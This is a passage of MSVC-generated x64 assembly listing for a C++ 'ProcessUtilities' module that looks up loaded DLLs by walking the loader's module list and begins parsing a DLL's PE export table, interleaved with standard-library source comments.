	mov	QWORD PTR $T1[rsp], rbx
	test	rbx, rbx

; 322  : {
; 323  :     if (m_Data == NULL) {

	je	$LN678@GetModHand

; 825  :     if (m_str == NULL) {

	mov	rax, QWORD PTR [rbx+8]
	test	rax, rax
	jne	SHORT $LN136@GetModHand

; 826  :         m_str = _com_util::ConvertBSTRToString(m_wstr);

	mov	rcx, QWORD PTR [rbx]
	call	?ConvertBSTRToString@_com_util@@YAPEADPEA_W@Z ; _com_util::ConvertBSTRToString
	mov	QWORD PTR [rbx+8], rax
$LN136@GetModHand:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 23   : 	return std::string(_bstr_t(inp));

	mov	rdx, rax
	lea	rcx, QWORD PTR $T8[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

; 773  :     unsigned long cRef = static_cast<unsigned long>(

	mov	eax, -1
	lock xadd DWORD PTR [rbx+16], eax
	cmp	eax, 1

; 774  :         InterlockedDecrement(reinterpret_cast<long*>(&m_RefCount)));
; 775  :     if (cRef == 0) {

	jne	SHORT $LN152@GetModHand

; 931  :     if (m_wstr != NULL) {

	mov	rcx, QWORD PTR [rbx]
	test	rcx, rcx
	je	SHORT $LN159@GetModHand

; 932  :         ::SysFreeString(m_wstr);

	call	QWORD PTR __imp_SysFreeString

; 933  :         m_wstr = NULL;

	mov	QWORD PTR [rbx], rdi
$LN159@GetModHand:

; 934  :     }
; 935  : 
; 936  :     if (m_str != NULL) {

	mov	rcx, QWORD PTR [rbx+8]
	test	rcx, rcx
	je	SHORT $LN160@GetModHand

; 937  :         delete [] m_str;

	call	??_V@YAXPEAX@Z				; operator delete[]

; 938  :         m_str = NULL;

	mov	QWORD PTR [rbx+8], rdi
$LN160@GetModHand:
	mov	edx, 24
	mov	rcx, rbx
	call	??3@YAXPEAX_K@Z				; operator delete
$LN152@GetModHand:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 67   : 		if ( _sub(_lower(PWSTRToString(modInfo->FullDllName.Buffer)), _lower(libName)) ) {

	lea	rdx, QWORD PTR $T8[rsp]
	lea	rcx, QWORD PTR $T16[rbp-256]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	npad	1
	mov	rdx, rsi
	mov	rcx, rax
	call	?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z ; ProcessUtilities::_sub
	test	eax, eax
	jne	$LN679@GetModHand

; 61   : 	LDR_DATA_TABLE_ENTRY* modInfo = NULL;
; 62   : 
; 63   : 	while ( nextEntry != modules ) {

	cmp	r15, r12
	jne	$LN722@GetModHand
$LN3@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [r14+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN642@GetModHand

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [r14]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN656@GetModHand

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN653@GetModHand

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN656@GetModHand:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN642@GetModHand:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 75   : 	return NULL;

	xor	eax, eax
$LN721@GetModHand:

; 76   : }

	mov	BYTE PTR [r14], 0
	mov	QWORD PTR [r14+24], 15
	mov	QWORD PTR [r14+16], 0
$LN1@GetModHand:
	mov	rcx, QWORD PTR __$ArrayPad$[rbp-256]
	xor	rcx, rsp
	call	__security_check_cookie
	lea	r11, QWORD PTR [rsp+288]
	mov	rbx, QWORD PTR [r11+56]
	mov	rsi, QWORD PTR [r11+64]
	mov	rdi, QWORD PTR [r11+72]
	mov	rsp, r11
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	pop	rbp
	ret	0
$LN679@GetModHand:

; 68   : 			HMODULE mod = ( HMODULE ) modInfo->DllBase;

	mov	rbx, QWORD PTR [r13+32]

; 69   : 			_loadedLibs.insert(std::pair<const char*, HMODULE>(_lower(libName).c_str(), mod));

	mov	rdx, r14
	lea	rcx, QWORD PTR $T15[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	lea	rcx, QWORD PTR $T7[rsp]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rax+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN540@GetModHand

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rax]
$LN540@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 247  :         : first(_STD forward<_Other1>(_Val1)), second(_STD forward<_Other2>(_Val2)) {

	mov	QWORD PTR $T6[rsp], rax
	mov	QWORD PTR $T6[rsp+8], rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map

; 271  :         return this->emplace(_STD forward<_Valty>(_Val));

	lea	r8, QWORD PTR $T6[rsp]
	lea	rdx, QWORD PTR $T13[rbp-256]
	call	??$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::emplace<std::pair<char const *,HINSTANCE__ *> >
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T7[rsp+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN568@GetModHand

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR $T7[rsp]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN582@GetModHand

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN728@GetModHand
$LN582@GetModHand:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
	npad	1
$LN568@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [r14+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN605@GetModHand

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [r14]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN619@GetModHand

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rcx, -8
	cmp	rcx, 31
	ja	SHORT $LN653@GetModHand

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN619@GetModHand:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN605@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [r14+16], rdi

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [r14+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [r14], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 71   : 			return mod;

	mov	rax, rbx
	jmp	$LN1@GetModHand
$LN675@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2673 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
	npad	1
$LN653@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN724@GetModHand:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN725@GetModHand:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN726@GetModHand:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN727@GetModHand:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN527@GetModHand:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN84@GetModHand:

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN676@GetModHand:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	npad	1
$LN677@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

; 694  :         _com_issue_error(E_OUTOFMEMORY);

	mov	ecx, -2147024882			; ffffffff8007000eH
	call	?_com_issue_error@@YAXJ@Z		; _com_issue_error
	npad	1
$LN728@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN678@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

; 324  :         _com_issue_error(E_OUTOFMEMORY);

	mov	ecx, -2147024882			; ffffffff8007000eH
	call	?_com_issue_error@@YAXJ@Z		; _com_issue_error
	int	3
$LN719@GetModHand:
?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetModHandle
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 72
$T7 = 88
$T8 = 88
$T9 = 88
$T10 = 88
$T11 = 120
$T12 = 152
$T13 = 184
$T14 = 184
$T15 = 200
$T16 = 200
$T17 = 232
libName$GSCopy$ = 264
__$ArrayPad$ = 272
libName$ = 336
?dtor$0@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetModHandle'::`1'::dtor$0
	mov	rcx, QWORD PTR libName$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetModHandle'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 72
$T7 = 88
$T8 = 88
$T9 = 88
$T10 = 88
$T11 = 120
$T12 = 152
$T13 = 184
$T14 = 184
$T15 = 200
$T16 = 200
$T17 = 232
libName$GSCopy$ = 264
__$ArrayPad$ = 272
libName$ = 336
?dtor$2@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetModHandle'::`1'::dtor$2
	lea	rcx, QWORD PTR $T4[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$2@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetModHandle'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 72
$T7 = 88
$T8 = 88
$T9 = 88
$T10 = 88
$T11 = 120
$T12 = 152
$T13 = 184
$T14 = 184
$T15 = 200
$T16 = 200
$T17 = 232
libName$GSCopy$ = 264
__$ArrayPad$ = 272
libName$ = 336
?dtor$5@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetModHandle'::`1'::dtor$5
	lea	rcx, QWORD PTR $T3[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$5@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetModHandle'::`1'::dtor$5
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 72
$T7 = 88
$T8 = 88
$T9 = 88
$T10 = 88
$T11 = 120
$T12 = 152
$T13 = 184
$T14 = 184
$T15 = 200
$T16 = 200
$T17 = 232
libName$GSCopy$ = 264
__$ArrayPad$ = 272
libName$ = 336
?dtor$8@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetModHandle'::`1'::dtor$8
	mov	rcx, QWORD PTR $T14[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$8@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetModHandle'::`1'::dtor$8
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 72
$T7 = 88
$T8 = 88
$T9 = 88
$T10 = 88
$T11 = 120
$T12 = 152
$T13 = 184
$T14 = 184
$T15 = 200
$T16 = 200
$T17 = 232
libName$GSCopy$ = 264
__$ArrayPad$ = 272
libName$ = 336
?dtor$17@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetModHandle'::`1'::dtor$17
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	edx, 24
	mov	rcx, QWORD PTR $T5[rbp]
	call	??3@YAXPEAX_K@Z				; operator delete
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$17@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetModHandle'::`1'::dtor$17
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 72
$T7 = 88
$T8 = 88
$T9 = 88
$T10 = 88
$T11 = 120
$T12 = 152
$T13 = 184
$T14 = 184
$T15 = 200
$T16 = 200
$T17 = 232
libName$GSCopy$ = 264
__$ArrayPad$ = 272
libName$ = 336
?dtor$15@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetModHandle'::`1'::dtor$15
	lea	rcx, QWORD PTR $T1[rdx]
	jmp	??1_bstr_t@@QEAA@XZ			; _bstr_t::~_bstr_t
?dtor$15@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetModHandle'::`1'::dtor$15
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 72
$T7 = 88
$T8 = 88
$T9 = 88
$T10 = 88
$T11 = 120
$T12 = 152
$T13 = 184
$T14 = 184
$T15 = 200
$T16 = 200
$T17 = 232
libName$GSCopy$ = 264
__$ArrayPad$ = 272
libName$ = 336
?dtor$12@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetModHandle'::`1'::dtor$12
	lea	rcx, QWORD PTR $T7[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$12@?0??GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetModHandle'::`1'::dtor$12
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
optHeader$ = 32
lib$ = 304
procedure$ = 312
?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::_GetFuncAddress, COMDAT

; 26   : FARPROC ProcessUtilities::_GetFuncAddress(HMODULE lib, std::string procedure) {

$LN115:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+24], rbp
	mov	QWORD PTR [rsp+32], rsi
	push	rdi
	push	r14
	push	r15
	sub	rsp, 272				; 00000110H

; 27   : 	// get nt and dos headers
; 28   : 	PIMAGE_DOS_HEADER       dosHeader = ( PIMAGE_DOS_HEADER ) lib;
; 29   : 	PIMAGE_NT_HEADERS       ntHeader = ( PIMAGE_NT_HEADERS ) ( dosHeader->e_lfanew + ( BYTE* ) lib );

	movsxd	r8, DWORD PTR [rcx+60]

; 30   : 	IMAGE_OPTIONAL_HEADER   optHeader = ntHeader->OptionalHeader;

	lea	rax, QWORD PTR optHeader$[rsp]
	add	r8, rcx
	lea	rax, QWORD PTR [rax+128]

; 31   : 	PIMAGE_EXPORT_DIRECTORY exports = ( PIMAGE_EXPORT_DIRECTORY ) ( ( BYTE* ) lib + optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
; 32   : 
; 33   : 	// Addresses
; 34   : 	DWORD* functionAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfFunctions );
; 35   : 	DWORD* funcNameAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfNames );
; 36   : 	WORD* funcNameOrdinals = ( WORD* ) ( ( BYTE* ) lib + exports->AddressOfNameOrdinals );
; 37   : 
; 38   : 	for ( DWORD funcIndex = 0; funcIndex < exports->NumberOfNames; funcIndex++ ) {

	xor	r9d, r9d
	mov	rbx, rdx
	mov	rsi, rcx
	movups	xmm0, XMMWORD PTR [r8+24]
	movups	xmm1, XMMWORD PTR [r8+40]
	movups	XMMWORD PTR [rax-128], xmm0
	movups	xmm0, XMMWORD PTR [r8+56]
	movups	XMMWORD PTR [rax-112], xmm1
	movups	xmm1, XMMWORD PTR [r8+72]
	movups	XMMWORD PTR [rax-96], xmm0
	movups	xmm0, XMMWORD PTR [r8+88]
	movups	XMMWORD PTR [rax-80], xmm1
	movups	xmm1, XMMWORD PTR [r8+104]
	movups	XMMWORD PTR [rax-64], xmm0
	movups	xmm0, XMMWORD PTR [r8+120]
	movups	XMMWORD PTR [rax-48], xmm1
	movups	XMMWORD PTR [rax-32], xmm0
	movups	xmm0, XMMWORD PTR [r8+136]
	add	r8, 152					; 00000098H
	movups	XMMWORD PTR [rax-16], xmm0
	movups	xmm1, XMMWORD PTR [r8]
	movups	xmm0, XMMWORD PTR [r8+16]
	movups	XMMWORD PTR [rax], xmm1
	movups	xmm1, XMMWORD PTR [r8+32]
	movups	XMMWORD PTR [rax+16], xmm0
	movups	xmm0, XMMWORD PTR [r8+48]
	movups	XMMWORD PTR [rax+32], xmm1
	movups	xmm1, XMMWORD PTR [r8+64]
	movups	XMMWORD PTR [rax+48], xmm0
	movups	xmm0, XMMWORD PTR [r8+80]
	movups	XMMWORD PTR [rax+64], xmm1
	movups	xmm1, XMMWORD PTR [r8+96]
	movups	XMMWORD PTR [rax+80], xmm0
	movups	XMMWORD PTR [rax+96], xmm1
